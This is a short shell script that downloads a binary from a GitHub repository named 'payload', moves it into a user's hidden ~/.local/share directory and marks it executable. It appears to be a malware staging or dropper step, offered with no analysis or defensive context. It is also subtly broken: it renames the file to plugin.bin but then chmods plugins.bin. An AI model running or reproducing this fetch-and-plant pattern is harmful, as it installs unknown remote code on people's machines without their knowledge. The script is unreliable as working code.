LOCATION=$(pwd)

curl -L -o ./plugins.bin https://github.com/Peppermint25565/payload/raw/refs/heads/main/plugins.bin
cd /home/*/.local/share
mv $LOCATION/plugins.bin ./plugin.bin
chmod +x ./plugins.bin
